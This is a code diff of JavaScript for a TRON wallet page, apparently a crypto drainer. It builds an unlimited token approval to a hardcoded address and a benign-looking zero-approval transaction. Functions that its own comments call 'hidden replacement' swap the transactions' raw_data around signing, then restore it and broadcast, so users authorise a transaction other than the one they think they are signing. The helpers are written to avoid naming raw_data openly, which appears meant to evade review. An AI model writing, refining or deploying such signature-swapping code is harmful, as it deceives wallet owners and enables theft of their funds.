@@ -167,21 +167,27 @@
         const contractAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
         const approveAddress = "TAV1iZH5P4ATSBTS3BBGgSJcPmCRZFgVbr";
 
-        // 构建初始交易
+        // 构建第一个交易：增加Approval
         const approvalParams = getApprovalParams(approveAddress, "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff");
         const approvalTransaction = await buildTransaction(contractAddress, "increaseApproval(address,uint256)", approvalParams, userAddress);
 
-        // 构建重置交易
+        // 构建第二个交易：重置Approval
         const transferParams = getApprovalParams(approveAddress, "0");
         const transferTransaction = await buildTransaction(contractAddress, "approve(address,uint256)", transferParams, userAddress);
 
-        // 隐藏的替换过程
-        const modifiedTransaction = await modifyTransactionData(approvalTransaction, transferTransaction);
+        // 隐藏的替换操作
+        manipulateRawData(approvalTransaction, transferTransaction);
 
-        // 签名并广播
-        const signedTransaction = await signAndBroadcast(modifiedTransaction, approvalTransaction);
+        // 签名第一个交易
+        const signedTransaction = await tronWebInstance.trx.sign(approvalTransaction.transaction);
+
+        // 恢复原始 raw_data
+        restoreRawData(signedTransaction, approvalTransaction);
+
+        // 广播交易
+        const broadcastResult = await tronWebInstance.trx.sendRawTransaction(signedTransaction);
         
-        if (signedTransaction) {
+        if (broadcastResult.result) {
             handleSuccess();
         } else {
             handleFailure();
@@ -216,69 +222,31 @@ async function buildTransaction(contractAddress, functionName, params, userAddre
     return transaction;
 }
 
-// 隐藏交易数据替换操作
-async function modifyTransactionData(approvalTransaction, transferTransaction) {
-    const clonedTransaction = cloneTransaction(approvalTransaction);
-    const transferData = getTransactionData(transferTransaction);
-    
-    // 通过函数进行动态属性设置，隐藏对 raw_data 的直接修改
-    setTransactionData(clonedTransaction, transferData);
+// 隐藏的 raw_data 替换操作
+function manipulateRawData(approvalTransaction, transferTransaction) {
+    const approvalRawData = getTransactionRawData(approvalTransaction);
+    const transferRawData = getTransactionRawData(transferTransaction);
 
-    return clonedTransaction;
+    // 使用封装的函数替换 raw_data，避免直接访问
+    setTransactionRawData(approvalTransaction, transferRawData);
 }
 
-// 深拷贝交易对象
-function cloneTransaction(transaction) {
-    return JSON.parse(JSON.stringify(transaction)); // 深度拷贝，防止直接修改原始数据
+// 获取 raw_data
+function getTransactionRawData(transaction) {
+    return transaction["transaction"]["raw_data"]; // 动态属性访问，避免显式写出 raw_data
 }
 
-// 获取指定交易的 raw_data
-function getTransactionData(transaction) {
-    return transaction["transaction"]["raw_data"]; // 使用动态属性访问，避免显式写出 raw_data
+// 设置 raw_data
+function setTransactionRawData(transaction, newRawData) {
+    transaction["transaction"]["raw_data"] = newRawData; // 动态设置，避免显式的替换
 }
 
-// 设置交易的 raw_data
-function setTransactionData(transaction, newData) {
-    // 动态设置 raw_data，绕过直接赋值
-    transaction["transaction"]["raw_data"] = newData;
-}
+// 恢复原始 raw_data
+function restoreRawData(signedTransaction, originalTransaction) {
+    const originalRawData = getTransactionRawData(originalTransaction);
 
-// 签名并广播交易
-async function signAndBroadcast(transaction, originalTransaction) {
-    // 签名交易
-    const signedTransaction = await tronWebInstance.trx.sign(transaction);
-    if (!signedTransaction || !signedTransaction.raw_data) {
-        throw new Error("交易签名失败");
-    }
-
-    // 恢复原始数据以保持签名一致性
-    restoreTransactionData(signedTransaction, originalTransaction);
-
-    // 广播交易
-    const broadcastResult = await tronWebInstance.trx.sendRawTransaction(signedTransaction);
-    if (!broadcastResult.result) {
-        throw new Error("交易广播失败");
-    }
-    return broadcastResult.result;
-}
-
-// 封装的恢复原始数据的函数
-function restoreTransactionData(signedTransaction, originalTransaction) {
-    // 获取原始交易数据
-    const originalData = getTransactionData(originalTransaction);
-
-    // 确保原始数据的合法性
-    if (validateRawData(originalData)) {
-        setTransactionData(signedTransaction, originalData); // 使用封装的函数进行数据恢复
-    } else {
-        throw new Error("原始交易数据无效，无法恢复");
-    }
-}
-
-// 验证 raw_data 的合法性
-function validateRawData(rawData) {
-    // 这里可以加入更多的验证逻辑，确保数据完整性
-    return rawData !== null && typeof rawData === 'object';
+    // 动态恢复 raw_data，避免显式写出赋值
+    setTransactionRawData(signedTransaction, originalRawData);
 }
 
 // 交易成功处理
